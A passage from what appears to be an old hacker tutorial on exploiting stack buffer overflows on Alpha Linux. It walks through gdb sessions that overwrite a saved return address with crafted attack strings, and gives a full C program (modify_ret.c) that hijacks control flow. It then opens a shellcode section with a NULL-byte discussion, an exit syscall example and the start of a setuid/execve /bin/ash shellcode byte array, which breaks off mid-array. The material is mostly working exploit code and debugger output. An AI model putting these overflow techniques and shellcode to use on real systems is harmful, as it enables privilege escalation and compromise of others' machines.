+0x120000440 <foo+64>:   ldq     ra,0(sp)
+0x120000444 <foo+68>:   ldq     fp,8(sp)
+0x120000448 <foo+72>:   addq    sp,0x30,sp
+0x12000044c <foo+76>:   ret     zero,(ra),0x1
+End of assembler dump.
+
+(gdb) b *main+24
+Breakpoint 1 at 0x120000478
+
+(gdb) x/i 0x120000478
+0x120000478 <main+24>:   mov   a0,t0
+
+(gdb) x/i 0x120000478-4
+0x120000474 <main+20>: mov     sp,fp
+
+(gdb) r
+Starting program: ./a.out
+
+breakpoint 1, 0x120000478 in main ()
+
+*** x/gx because of the 64bit addresses ***
+(gdb) x/gx $fp
+0x11ffffc30:    0x000002000014ffb0
+
+*** we would return here ***
+(gdb) x/i 0x000002000014ffb0
+0x2000014ffb0 <__libc_start_main+336>:   ldah   gp,32(ra)
+*** the jump subroutine instruction ***
+(gdb) x/i 0x000002000014ffb0-4
+0x2000014ffac <__libc_start_main+332>:
+    jsr ra,(t12),0x2000014ffb0 <__libc_start_main+336>
+(gdb)
+
+main()'s frame after prologue:
+------------------------------
+
+0x120000468 <main+8>:   subq     sp,0x20,sp
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local                      S   24(fp) local quad2
+S----------------------------S
+S local                      S   16(fp) local quad1
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S saved ra                   S   0(fp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      The only element of main()'s stack frame that interests us
+      right now is the saved ra.
+
+      Now run ./a.out (stack.c) with 1111 A's. Put a breakpoint just
+      after foo()'s prologue, and another breakpoint just after the
+      jsr to strcpy() in the foo() procedure.
+
+*** (gdb) x/i foo+24-4 -> 0x120000414 <foo+20>:       mov   sp,fp ***
+(gdb) b *foo+24
+Breakpoint 1 at 0x120000418
+
+*** x/i foo+48-4 -> 0x12000042c <foo+44>:     jsr      ra,(t12),0x1200005b4 ***
+(gdb) b *foo+48
+Breakpoint 2 at 0x120000430
+
+(gdb) r AAAAAAA....output trimmed
+Breakpoint 1, 0x120000418 in foo ()
+
+*** $fp contains our return address, $fp = 0(fp)
+(gdb) x/gx $fp
+0x11ffff790:    0x0000000120000494
+
+*** We would normally return here, which is the beginning of the epilogue ***
+(gdb) x/i 0x0000000120000494
+0x120000494 <main+52>: mov      fp,sp
+
+*** The branch sub routine instruction which passed control to foo() ***
+(gdb) x/i 0x0000000120000494-4
+0x120000490 <main+48>: bsr      ra,0x120000408 <foo+8>
+
+foo()'s frame after prologue:
+-----------------------------
+
+0x120000408 <foo+8>:    subq     sp,0x30,sp
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local (padding)            S   40(fp)
+S----------------------------S
+S local (buffer quadword 2) S    32(fp)
+S----------------------------S
+S local (buffer quadword 1) S    24(fp)
+S----------------------------S
+S local (temporary a0 & a1) S    16(fp)
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S saved ra                   S   0(fp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x120000430 in foo ()
+
+foo()'s frame after the string copy:
+------------------------------------
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S AAAAAAAA (8 A's)           S   40(fp)
+S----------------------------S
+S AAAAAAAA (8 A's)           S   32(fp)
+S----------------------------S
+S AAAAAAAA (8 A's)           S   24(fp)
+S----------------------------S
+S local (temporary a0 & a1) S    16(fp)
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S saved ra                   S   0(fp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+*** The return address (untouched after a bad string copy) ***
+(gdb) x/gx $fp
+0x11ffff790:    0x0000000120000494
+
+*** The saved frame pointer (untouched as well) ***
+(gdb) x/gx $fp+8
+0x11ffff798:    0x000000011ffff7c0
+
+*** The `local temporary stack element' (untouched as well)
+(gdb) x/gx $fp+8+8
+0x11ffff7a0:    0x000000011ffffa07
+
+*** First quadword of our buffer ***
+(gdb) x/gx $fp+8+8+8
+0x11ffff7a8:    0x4141414141414141
+
+*** Second quadword of our buffer ***
+(gdb) x/gx $fp+8+8+8+8
+0x11ffff7b0:    0x4141414141414141
+
+*** Local padding ***
+(gdb) x/gx $fp+8+8+8+8+8
+0x11ffff7b8:    0x4141414141414141
+
+*** Saved return address of main ***
+(gdb) x/gx $fp+8+8+8+8+8+8
+0x11ffff7c0:    0x4141414141414141
+
+*** Saved fp of main ***
+(gdb) x/gx $fp+8+8+8+8+8+8+8
+0x11ffff7c8:    0x4141414141414141
+
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+warning: Hit heuristic-fence-post without finding
+warning: enclosing function for address 0x4141414141414140
+This warning occurs if you are debugging a function without any symbols
+(for example, in a stripped executable). In that case, you may wish to
+increase the size of the search with the `set heuristic-fence-post' command.
+
+Otherwise, you told GDB there was a function where there isn't one, or
+(more likely) you have encountered a bug in GDB.
+0x4141414141414140 in ?? ()
+
+*** The reason for 0x4141414141414140 and not 0x4141414141414141 is because
+    0x4141414141414141 is not aligned on a longword (instruction size)
+    boundary. ***
+
+      Let's look at our main+foo stack, and we should understand what is going on.
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local (8 A's)              S
+S----------------------------S
+S local (8 A's)              S
+S----------------------------S
+S main's saved fp (8 A's)    S
+S----------------------------S   <- main's frame
+S main's saved ra (8 A's)    S
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::   v- foo()'s frame
+S----------------------------S
+S local (8 A's)              S
+S----------------------------S
+S local (8 A's)              S   buffer (quadword 2)
+S----------------------------S
+S local (8 A's)              S   buffer (quadword 1)
+S----------------------------S
+S local (temporary storage)  S
+S----------------------------S
+S saved fp                   S
+S----------------------------S
+S saved ra                   S
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      As you can see, *everything* is overwritten with A's. That is
+      not our goal though, we want to overwrite with 0x4142434445464748.
+      The only elements which are not overwritten with A's is foo()'s
+      saved fp and ra, and the local temporary storage for registers
+      a0 and a1.
+
+      Ok, let's refer back to the stack diagram, and see how foo()'s
+      frame is built, because, we need to build some sort of
+      `attack buffer' in order to overwrite the ret correctly.
+
+0x120000408 <foo+8>:    subq     sp,0x30,sp
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local (padding?)           S   40(fp)
+S----------------------------S
+S local (buffer quadword 2)  S    32(fp)
+S----------------------------S
+S local (buffer quadword 1)  S    24(fp)
+S----------------------------S
+S local (temporary a0 & a1)  S    16(fp)
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S saved ra                   S   0(fp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      Ok,   so let's make a checklist:
+      [x]   a quadword for buffer (quadword 1)
+      [x]   a quadword for buffer (quadword 2)
+      [x]   a quadword for the padding
+      [x]   our 0x4142434445464748 address
+
+      Let's build it like so:
+      <quadword of z's><quadword of z's><quadword of u's><0x4142434445464748>
+      ^^ buffer q1     ^^ buffer q2     ^^ padding       ^^ saved ret
+
+      Will this `zzzzzzzzzzzzzzzzuuuuuuuuABCDEFGH' be a valid attack
+      buffer? Hopefully! It probably will, our calculations seem good.
+
+*** Breakpoint just after the procedure prologue ***
+(gdb) b *foo+24
+Breakpoint 1 at 0x120000418
+^^^ (gdb) x/i foo+24-4 -> 0x120000414 <foo+20>:   mov      sp,fp ***
+
+*** Breakpoint just after the string copy ***
+(gdb) b *foo+48
+Breakpoint 2 at 0x120000430
+^^^ x/i foo+48-4 -> 0x12000042c <foo+44>:   jsr       ra,(t12),0x1200005b4 ***
+
+*** Our attack string! ***
+(gdb) r zzzzzzzzzzzzzzzzuuuuuuuuABCDEFGH
+Starting program: ./a.out zzzzzzzzzzzzzzzzuuuuuuuuABCDEFGH
+
+Breakpoint 1, 0x120000418 in foo ()
+^^^ We are at a useless breakpoint, lets just continue ^^^
+
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x120000430 in foo ()
+^^^ We have just string copied, let's check the stack layout ^^^
+
+*** Saved return address for foo() 0(fp) ***
+(gdb) x/gx $fp
+0x11ffffbd0:    0x0000000120000494
+
+*** Saved fp for foo() 8(fp) ***
+(gdb) x/gx $fp+8
+0x11ffffbd8:    0x000000011ffffc00
+
+*** Local (temporary space) on the stack 16(fp) ***
+(gdb) x/gx $fp+8+8
+0x11ffffbe0:    0x000000011ffffe3e
+
+*** First quadword of buffer (That is 8 z's!) 24(fp) ***
+(gdb) x/gx $fp+8+8+8
+0x11ffffbe8:    0x7a7a7a7a7a7a7a7a
+
+*** Second quadword of buffer (That is 8 z's as well!) 32(fp) ***
+(gdb) x/gx $fp+8+8+8+8
+0x11ffffbf0:    0x7a7a7a7a7a7a7a7a
+
+*** Local (padding) That is 8 u's! 40(fp) ***
+(gdb) x/gx $fp+8+8+8+8+8
+0x11ffffbf8:    0x7575757575757575
+
+*** THE SAVED RETURN ADDRESS OF MAIN()! WTF IT'S BACKWARDS? 48(fp) ***
+(gdb) x/gx $fp+8+8+8+8+8+8
+0x11ffffc00:    0x4847464544434241
+*** Saved frame pointer (untouched) 56(fp) ***
+(gdb) x/gx $fp+8+8+8+8+8+8+8
+0x11ffffc08:    0x0000000120000400
+
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+warning: Hit heuristic-fence-post without finding
+warning: enclosing function for address 0x4847464544434240
+This warning occurs if you are debugging a function without any symbols
+(for example, in a stripped executable). In that case, you may wish to
+increase the size of the search with the `set heuristic-fence-post' command.
+
+Otherwise, you told GDB there was a function where there isn't one, or
+(more likely) you have encountered a bug in GDB.
+0x4847464544434240 in ?? ()
+(gdb)
+
+      Ok, everything went well but why did it try to return to
+      0x4847464544434240?!?! Oh, Alpha is little endian. Ok, easy
+      enough.
+
+      Our new attack buffer will be:
+      `zzzzzzzzzzzzzzzzuuuuuuuuHGFEDCBA'
+
+      Let's test:
+
+(gdb) r zzzzzzzzzzzzzzzzuuuuuuuuHGFEDCBA
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: ./a.out zzzzzzzzzzzzzzzzuuuuuuuuHGFEDCBA
+
+Breakpoint 1, 0x120000418 in foo ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x120000430 in foo ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+warning: Hit heuristic-fence-post without finding
+warning: enclosing function for address 0x4142434445464748
+0x4142434445464748 in ?? ()
+(gdb)
+
+      We overwrote the ret on a program which compiles with
+      no optimizations. Here's what is a little tricky about Alpha:
+
+              * Programs compiled with different optimization levels
+                produce way different prologues and epilogues, as well
+                as more efficient code (different buff size, no saved fp).
+
+      This means, if we run into a program compiled with -O(1,2,3), we must
+      take an entirely different approach. In the next couple of subsections
+      I will briefly go over modifying the ret using different optimization
+      levels. For this type of analysis, we really have to look at the
+      assembler code to find out how everything is setup.
+      First, here is a snippet from the gcc optimizations section:
+
+OPTIMIZATION OPTIONS
+       These options control various sorts of optimizations:
+
+      -O
+
+      -O1    Optimize. Optimizing compilation takes somewhat
+             more time, and a lot more memory for a large func-
+             tion.
+
+             Without `-O', the compiler's goal is to reduce the
+             cost of compilation and to make debugging produce
+             the expected results. Statements are independent:
+             if you stop the program with a breakpoint between
+             statements, you can then assign a new value to any
+             variable or change the program counter to any other
+             statement in the function and get exactly the re-
+             sults you would expect from the source code.
+
+             Without `-O', only variables declared register are
+             allocated in registers.    The resulting compiled
+             code is a little worse than produced by PCC without
+             `-O'.
+
+             With `-O', the compiler tries to reduce   code    size
+             and execution time.
+
+             When    you   specify   `-O',   the   two   options
+             `-fthread-jumps' and `-fdefer-pop' are turned on.
+             On    machines   that   have   delay   slots,   the
+             `-fdelayed-branch' option is turned on. For those
+             machines that can support debugging even without a
+             frame pointer, the `-fomit-frame-pointer' option is
+             turned on.    On some machines other flags may also
+             be turned on.
+
+      -O2    Optimize even more. Nearly all supported optimiza-
+             tions that do not involve a space-speed tradeoff
+             are performed. Loop unrolling and function inlin-
+             ing are not done, for example. As compared to -O,
+             this option increases both compilation time and the
+             performance of the generated code.
+
+      -O3    Optimize yet more. This turns on everything -O2
+             does, along with also turning on -finline-func-
+             tions.
+
+      -O0    Do not optimize.
+
+      Now we will go over modifying the ret when stack.c is compiled with -O optimization level.
+
+             $ gcc stack.c -O -o stack
+
+[andrew_darqui@blah exp]$ gcc stack.c -O -o stack
+[andrew_darqui@blah exp]$ gdb ./stack
+GNU gdb 4.17.0.11 with Linux support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "alpha-redhat-linux"...
+(gdb) disass main
+Dump of assembler code for function main:
+0x120000440 <main>:     ldah    gp,17(t12)
+0x120000444 <main+4>:   lda     gp,-32448(gp)
+0x120000448 <main+8>:   subq    sp,0x10,sp
+0x12000044c <main+12>: stq      ra,0(sp)
+0x120000450 <main+16>: ldq      a0,8(a1)
+0x120000454 <main+20>: bsr      ra,0x120000408 <foo+8>
+0x120000458 <main+24>: ldq      ra,0(sp)
+0x12000045c <main+28>: addq     sp,0x10,sp
+0x120000460 <main+32>: ret      zero,(ra),0x1
+End of assembler dump.
+(gdb) disass foo
+Dump of assembler code for function foo:
+0x120000400 <foo>:      ldah    gp,17(t12)
+0x120000404 <foo+4>:    lda     gp,-32384(gp)
+0x120000408 <foo+8>:    subq    sp,0xa0,sp
+0x12000040c <foo+12>:   stq     ra,0(sp)
+0x120000410 <foo+16>:   mov     a0,a1
+0x120000414 <foo+20>:   addq    sp,0x10,a0
+0x120000418 <foo+24>:   ldq     t12,-32728(gp)
+0x12000041c <foo+28>:   jsr     ra,(t12),0x120000574
+0x120000420 <foo+32>:   ldah    gp,17(ra)
+0x120000424 <foo+36>:   lda     gp,-32416(gp)
+0x120000428 <foo+40>:   ldq     ra,0(sp)
+0x12000042c <foo+44>:   addq    sp,0xa0,sp
+0x120000430 <foo+48>:   ret     zero,(ra),0x1
+End of assembler dump.
+
+      As you can see, main() is still storing its return address
+      on the first quadword of the stack pointer:
+
+             0x12000044c <main+12>:    stq    ra,0(sp)
+
+      The procedure prologue and epilogue for the main() procedure:
+
+             PROLOGUE:
+             0x120000448 <main+8>:     subq   sp,0x10,sp
+             0x12000044c <main+12>:    stq    ra,0(sp)
+
+             EPILOGUE:
+             0x120000458 <main+24>:    ldq    ra,0(sp)
+             0x12000045c <main+28>:    addq   sp,0x10,sp
+             0x120000460 <main+32>:    ret    zero,(ra),0x1
+
+      Our main() frame looks like this:
+
+main()'s frame:
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local (extra quad)         S 8(sp)
+S----------------------------S
+S saved ra                   S 0(sp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      Notice how main() doesn't even use a frame pointer. Also notice
+      how we don't save a frame pointer. But what is important to us,
+      is that the saved return address is still located in the first
+      quadword on main()'s `frame' 0(sp).
+
+       The procedure prologue and epilogue for the foo() procedure:
+
+             PROLOGUE:
+             0x120000408 <foo+8>:       subq       sp,0xa0,sp
+             0x12000040c <foo+12>:      stq        ra,0(sp)
+
+             EPILOGUE:
+             0x120000428 <foo+40>:      ldq        ra,0(sp)
+             0x12000042c <foo+44>:      addq       sp,0xa0,sp
+             0x120000430 <foo+48>:      ret        zero,(ra),0x1
+
+      0xa0? 0xa0 in decimal is 160, which seems a bit ridiculously
+      large for a 12 byte buffer. So here is foo()'s frame:
+
+foo()'s frame:
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local                      S 8(sp) through 160(sp)
+S----------------------------S
+S saved ra                   S 0(sp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      There is one problem, we do not know where our vulnerable
+      buffer is located on the stack. This can easily be found out
+      by looking at the assembler output:
+
+             A)   0x120000408   <foo+8>:    subq     sp,0xa0,sp
+             B)   0x12000040c   <foo+12>:   stq      ra,0(sp)
+             C)   0x120000410   <foo+16>:   mov      a0,a1
+             D)   0x120000414   <foo+20>:   addq     sp,0x10,a0
+
+      A) subtract 160 bytes from the stack pointer, and store this
+         new address in the stack pointer.
+
+      B) store the return address into 0(sp)
+
+      C) move the address in a0 (string passed to foo() : first arg)
+         into register a1
+
+      D) place the address of sp+0x10 into register a0
+
+      strcpy() now looks like:
+
+             strcpy((buffer)sp+0x10, a1(attack buffer))
+
+             or
+
+             strcpy(a0, a1)
+
+      Both represent the same thing. So now we know where our buffer
+      starts on the stack, the rest is trivial.
+
+stack:
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local (extra quad)         S   8(sp)
+S----------------------------S
+S saved ra                   S   0(sp)
+S----------------------------S   <- main()'s frame
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+S----------------------------S   <- foo()'s frame
+S local                      S   16(sp) through 160(sp)
+$----------------------------S
+S local (stuff)              S   8(sp)
+S----------------------------S
+S saved ra                   S   0(sp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      From the base 16(sp) to 160(sp) is 144 bytes. So this will
+      contain our useless values. Next up on the stack, is the
+      return address. So an attack buffer would now look like this:
+
+             <144 bytes><HGFEDCBA>
+             ^^ garbage ^^ return address (0x4142434445464748)
+
+             or
+
+             <AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+                 AAAAAAAAAAAAAAAAAAAA><HGFEDCBA>
+                 ^^ garbage            ^^ return address (0x4142434445464748)
+
+      Now let's test it:
+
+(gdb) r
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHGFEDCBAStarting program:
+/home/andrew_darqui/local/exp/./stack
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHGFEDCBA
+
+Program received signal SIGSEGV, Segmentation fault.
+warning: Hit heuristic-fence-post without finding
+warning: enclosing function for address 0x4142434445464748
+This warning occurs if you are debugging a function without any symbols
+(for example, in a stripped executable). In that case, you may wish to
+increase the size of the search with the `set heuristic-fence-post' command.
+
+Otherwise, you told GDB there was a function where there isn't one, or
+(more likely) you have encountered a bug in GDB.
+0x4142434445464748 in ?? ()
+(gdb)
+
+      Modifying the ret with an optimization level of 1 was a success!
+
+
+
+
+      Now we will modify the ret using an optimization level of 2:
+
+             $ gcc stack.c -O2 -o stack
+
+[andrew_darqui@blah exp]$ gdb ./stack
+GNU gdb 4.17.0.11 with Linux support
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "alpha-redhat-linux"...
+(gdb) disass main
+Dump of assembler code for function main:
+0x120000440 <main>:     ldah    gp,17(t12)
+0x120000444 <main+4>:   lda     gp,-32448(gp)
+0x120000448 <main+8>:   subq    sp,0x10,sp
+0x12000044c <main+12>: ldq      a0,8(a1)
+0x120000450 <main+16>: stq      ra,0(sp)
+0x120000454 <main+20>: bsr      ra,0x120000408 <foo+8>
+0x120000458 <main+24>: ldq      ra,0(sp)
+0x12000045c <main+28>: addq     sp,0x10,sp
+0x120000460 <main+32>: ret      zero,(ra),0x1
+End of assembler dump.
+(gdb) disass foo
+Dump of assembler code for function foo:
+0x120000400 <foo>:      ldah    gp,17(t12)
+0x120000404 <foo+4>:    lda     gp,-32384(gp)
+0x120000408 <foo+8>:    subq    sp,0xa0,sp
+0x12000040c <foo+12>:   mov     a0,a1
+0x120000410 <foo+16>:   addq    sp,0x10,a0
+0x120000414 <foo+20>:   stq     ra,0(sp)
+0x120000418 <foo+24>:   ldq     t12,-32728(gp)
+0x12000041c <foo+28>:   jsr     ra,(t12),0x120000574
+0x120000420 <foo+32>:   ldah    gp,17(ra)
+0x120000424 <foo+36>:   lda     gp,-32416(gp)
+0x120000428 <foo+40>:   ldq     ra,0(sp)
+0x12000042c <foo+44>:   addq    sp,0xa0,sp
+0x120000430 <foo+48>:   ret     zero,(ra),0x1
+End of assembler dump.
+
+      Look at the assembler output carefully. You will come to notice,
+      the only thing different in the program is the stream of
+      instructions.
+
+             PROLOGUE OF main() FROM OPTIMIZATION LEVEL 1:
+                +0x120000448 <main+8>:   subq    sp,0x10,sp
+                +0x12000044c <main+12>: stq      ra,0(sp)
+
+             PROLOGUE OF main() FROM OPTIMIZATION LEVEL 2:
+             +0x120000448 <main+8>:   subq    sp,0x10,sp
+             -0x12000044c <main+12>: ldq      a0,8(a1)
+             +0x120000450 <main+16>: stq      ra,0(sp)
+
+      The prologues from procedure main() look exactly the same. Now lets
+      check out the prologues of procedure foo().
+
+             PROLOGUE OF foo() FROM OPTIMIZATION LEVEL 1:
+                +0x120000408 <foo+8>:    subq    sp,0xa0,sp
+                +0x12000040c <foo+12>:   stq     ra,0(sp)
+
+             PROLOGUE OF foo() FROM OPTIMIZATION LEVEL 2:
+             +0x120000408 <foo+8>:    subq    sp,0xa0,sp
+             -0x12000040c <foo+12>:     mov     a0,a1
+             -0x120000410 <foo+16>:     addq    sp,0x10,a0
+             +0x120000414 <foo+20>:     stq     ra,0(sp)
+
+      The prologues for foo() look exactly the same as well. The only
+      question we have now, is where does our buffer start?
+
+               0x120000410 <foo+16>:     addq     sp,0x10,a0
+
+      This is the same as optimization level 1. We will use the
+      same attack buffer to try and overwrite the ret:
+
+(gdb) r
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHGFEDCBAStarting program:
+/home/andrew_darqui/local/exp/./stack
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHGFEDCBA
+
+Program received signal SIGSEGV, Segmentation fault.
+warning: Hit heuristic-fence-post without finding
+warning: enclosing function for address 0x4142434445464748
+This warning occurs if you are debugging a function without any symbols
+(for example, in a stripped executable). In that case, you may wish to
+increase the size of the search with the `set heuristic-fence-post' command.
+
+Otherwise, you told GDB there was a function where there isn't one, or
+(more likely) you have encountered a bug in GDB.
+0x4142434445464748 in ?? ()
+(gdb)
+
+      The two optimizations didn't differ at all, we did not have to
+      change 1 thing. This is not always the case. In live exploits
+      there is a lot of change and a lot of differences in the assembler,
+      so keep this in mind. You will see at the end of the Writing an
+      Alpha exploit section (exp2.c).
+
+      Now onto a much more fun topic:
+
+             WRITING ALPHA SHELLCODE.
+
++BEGIN modify_ret.c
+
+/*
+ * modify_ret.c - Hook ret to hello() - ret modification example
+ *
+ * Compile using no optimizations
+ *
+ * by andrew_darqui of someplace
+ */
+
+
+/*
+0x120000840   <vuln+8>:    lda    sp,-48(sp)
+0x120000844   <vuln+12>:   stq    ra,0(sp)
+0x120000848   <vuln+16>:   stq    fp,8(sp)
+0x12000084c   <vuln+20>:   mov    sp,fp
+0x120000850   <vuln+24>:   stq    a0,16(fp)
+0x120000854   <vuln+28>:   addq   fp,0x18,t0
+
+our buffer is actually 16 bytes, there are an extra 8 bytes
+passed our buffer for some reason, so im using EXTRA, as another quad
+*/
+
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+
+#define BUFF_SIZE 12
+#define QUAD       8
+#define EXTRA      8
+#define RA         8
+
+
+int
+hello(void)
+{
+    puts("Hello world!");
+
+    return 0;
+}
+
+
+int
+vuln(char *str)
+{
+    char               buffer[BUFF_SIZE];
+
+    strcpy(buffer, str);
+
+    return 0;
+}
+
+
+int
+aalign(unsigned long *x, int y)
+{
+    /*
+     * Align x to y boundary
+     */
+    unsigned long              z;
+
+    z = *x;
+
+    while (1) {
+        if ((z % y) == 0)
+            break;
+        z++;
+    }
+
+    *x = z;
+    return (0);
+}
+
+
+int
+main(int argc, char *argv[])
+{
+    unsigned long   hello_addr,
+                    vuln_addr;
+    int             actual_buff_sz;
+    unsigned char *area = NULL;
+
+
+    hello_addr = (unsigned long) &hello;
+
+    printf("hello()'s address is [0x%lx:%li]\n\n", hello_addr, hello_addr);
+
+    vuln_addr = (unsigned long) &vuln;
+
+    printf("vuln()'s address is [0x%lx:%li]\n\n", vuln_addr, vuln_addr);
+
+    actual_buff_sz = 12;
+    aalign(&actual_buff_sz, QUAD);
+
+    printf("BUFF_SIZE [0x%x] : Actual buff size [0x%x]\n\n",
+           BUFF_SIZE, actual_buff_sz);
+
+    area = (unsigned char *) calloc(1, actual_buff_sz + EXTRA + RA);
+    if (area == NULL) {
+        perror("main() : calloc() ");
+        exit(-1);
+    }
+
+    memset(area, 'A'            /*
+                                 * 0x41
+                                 */ , (actual_buff_sz + EXTRA));
+
+    *(unsigned long *) (area + actual_buff_sz + EXTRA) =
+        (unsigned long) hello_addr;
+
+    puts("Overwriting main's ret! We should get to hello()! HOLDON!");
+
+    vuln(area);
+
+    return 0;
+}
++END modify_ret.c
+
+
+<05 : Writing Alpha shellcode>
+
+      The purpose of shellcode is to `do something' once the
+      vulnerable program has been exploited. Shellcode consists
+      of CPU instructions and operating system dependent syscalls.
+      Usually we can't have any NULL bytes in the shellcode, this is
+      because a string copy terminates at the NULL byte. Sometimes
+      we may only be allowed tolower() characters, or toupper()
+      characters. This can all get very difficult, but that isn't
+      the purpose of this section.
+
+      First lets take a look at how the Alpha Linux system calls work.
+
+      All system call numbers go in register v0 (r0). The system
+      call numbers are in /usr/include/asm/unistd.h. For example
+      the execve system call is defined as:
+
+                #define __NR_execve          59
+
+      Execve takes 3 arguments. Each argument goes in an aX register,
+      for example, the filename argument goes in register a0, the
+      argv argument goes in a1, the envp argument goes in a2.
+
+      Register v0 (r0) is also the return value register of the syscall.
+
+      When we want to initiate the syscall, we use the `callsys'
+      PALcode instruction. Here is a small program which shows
+      how to use the exit syscall.
+
++BEGIN exit.s
+
+.globl main
+.type main,@function
+
+main:
+cmoveq $31, 1, $0
+cmoveq $31, 0x9, $16
+callsys
+
++END exit.s
+
+$ gcc exit.s
+$ strace ./a.out
+...
+exit(9)                                = ?
+
+      The only problem with this shellcode is, it contains NULL bytes.
+      The NULL bytes are in the `callsys' instruction itself. It is not
+      that hard to remove the NULL bytes.
+
+                callsys instruction:
+
+                0x00000083
+
+      When we are in the stack, we can change any of the actual instructions
+      whenever we want. We would have to use a store instruction, to store
+      the NULL bytes into the dummy instruction. For example, disguising
+      callsys as:
+
+              callsys disguised:
+
+              0xffffff83
+
+      So to fix the callsys instruction we place the dummy callsys
+      somewhere on the stack, and manually change the bytes. This
+      doesn't seem too hard. But there is one problem, we do not know
+      where we are in the stack. It is hard to find out, because,
+      we can't use forward branches unless they are *HUGE* displacements.
+
+      Somehow we have to get the vulnerable program to return *DIRECTLY*
+      to our first instruction, which most of you know, is quite improbable.
+      That will be discussed in the next section, I will put that aside,
+      and focus on the shellcode.
+
+      I will go over three simple shellcodes:
+
+      * execve
+      * passwd
+      * portshell
+
+      To make things seep in, I go over the `execve' shellcode and
+      the `passwd' shellcode in exactly the same manner.
+
+      First we will start with the execve shellcode. This particular
+      shellcode is not very complex, because we are going to execute
+      /bin/ash instead of /bin/sh or /bin/bash. The reason executing
+      /bin/ash is much smaller, is because we don't need argv or env
+      we just need the filename, then we execute the execve system
+      call. I will leave it up to you to make /bin/sh etc shellcodes.
+      The shellcode is 68 bytes in length. We have two syscalls:
+
+      * setuid
+      * execve
+
+unsigned char alpha_exec_shellcode[] = /* XXX shellcode by andrew_darqui */
+
+                                      /*   NOTE:    exec /bin/ash */
+"\x9a\x02\x5a\x23"                    /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                    /*   stl      zero,-653(ra) */
+"\x86\xfd\x3a\x21"                    /*   lda      s0,-634(ra)   */
+"\x83\xff\xff\xff"                    /*   data     (callsys)     */
+"\xff\xff\xff\xff"                    /*   data     (bgt)         */
+"\x01\x80\xe9\x6b"                    /*   ret      zero,(s0),0x1 */
+"\x2f\x62\x69\x6e"                    /*   data                   */
+"\x2f\x61\x73\x68"                    /*   data                   */
+"\x80\xf4\xe2\x47"                    /*   cmoveq   zero,0x17,v0 */
+"\x90\x04\xff\x47"                    /*   cmoveq   zero,zero,a0 */
